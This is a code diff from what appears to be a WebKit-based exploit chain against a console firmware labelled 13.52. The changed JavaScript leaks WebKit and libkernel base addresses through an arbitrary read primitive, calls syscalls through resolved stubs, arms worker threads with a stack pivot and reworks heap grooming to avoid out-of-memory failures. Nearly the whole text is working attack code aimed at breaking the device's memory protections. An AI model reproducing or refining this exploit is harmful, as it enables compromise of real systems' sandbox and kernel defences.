@@ -131,7 +131,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
+const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
 
 (async function () {
     let p = null;
@@ -261,12 +261,12 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
             mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                 + " cycles=" + SWEEP_CYCLES);
         }
-        if (!pairStatus.promoted) {
+        {
             const gd = dropGroomFootprint();
-            mark("GROOM-DROPPED", "ok=" + (gd.dropped ? 1 : 0)
+            mark("GROOM-DROP-CHAIN", "dropped=" + (gd.dropped ? 1 : 0)
                 + (gd.reason ? " reason=" + gd.reason : ""));
-            for (let gi = 0; gi < 4; ++gi)
-                await new Promise(r => setTimeout(r, 0));
+            for (let bi = 0; bi < 16; ++bi)
+                await new Promise(r => setTimeout(r, 16));
         }
         mark("PRIMITIVE-OK", "");
 
@@ -375,19 +375,13 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
             .add32(off.wk_JSFunction_m_function));
         const webkitBase = MEASURED.webkit
             || nativeFn.sub32(off.wk_expm1_builtin);
-        let errorFn = null;
-        if (off.wk___imp___error) {
-            try { errorFn = p.read8(webkitBase.add32(off.wk___imp___error)); } catch (_) { }
-        }
+        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
         const libkernelBase = MEASURED.libkernel
-            || (errorFn ? errorFn.sub32(off.k__error) : null);
-        if (libkernelBase && off.k__error)
-            errorFn = libkernelBase.add32(off.k__error);
+            || errorFn.sub32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
             + (MEASURED.webkit ? " (measured)" : "")
             + (MEASURED.libkernel ? " (measured)" : ""));
-        mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
-        const aligned = v => v && v.hi > 0 && (v.low & 0x3fff) === 0;
+        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
@@ -460,8 +454,6 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
-                if (!v || typeof v.low !== "number" || typeof v.hi !== "number")
-                    throw new Error("put: bad int64 at 0x" + at.toString(16));
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
@@ -521,14 +513,8 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => {
-            const stub = stubAddr.get(num);
-            if (!stub)
-                throw new Error("missing syscall stub num=0x" + (num >>> 0).toString(16));
-            return callAddr(stub, a);
-        };
+        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
         function errno() {
-            if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
@@ -1471,6 +1457,14 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
+        async function jscBreath(n, why) {
+            for (let bi = 0; bi < n; ++bi) {
+                await new Promise(r => setTimeout(r, 16));
+                sc(SYS.sched_yield);
+            }
+            mark("JSC-BREATH", "n=" + n + " at=" + why);
+        }
+        await jscBreath(24, "pre-worker-pool");
         state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
@@ -1483,7 +1477,7 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
                 throw new Error(name + " did not answer ping");
             const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
             const arr = await w.rpc("init", 15000, sLo, sHi);
-            keepAlive.push(arr);
+            w.markerArr = arr;
             const D = bufAddr(arr.buffer);
             if ((p.read4(D) >>> 0) !== sLo)
                 throw new Error(name + ": transfer did not preserve the store");
@@ -1507,7 +1501,6 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
             await w.rpc("setup", 15000, wl.low, wl.hi);
             await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
             w.armed = true;
-            w.ctx = makeCtx(false);
             await new Promise(r => setTimeout(r, 0));
             sc(SYS.sched_yield);
         }
@@ -1611,13 +1604,12 @@ const CHAIN_BUILD = "chain_1352-2026-03-26d-groomdrop";
                 + " affinity=" + a + " rtprio=" + r);
         }
         function fireW(w, num, args, timeoutMs) {
+            if (!w.ctx) w.ctx = makeCtx(false);
             layout(w.ctx, stubAddr.get(num), args);
             return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
         }
-        // Worker pin burst OOMs on 13.52 if the heap cannot sweep — yield between fires.
-        await new Promise(r => setTimeout(r, 0));
-        sc(SYS.sched_yield);
+        await jscBreath(8, "pre-worker-pin");
         for (const w of workers) {
             await new Promise(r => setTimeout(r, 0));
             sc(SYS.sched_yield);
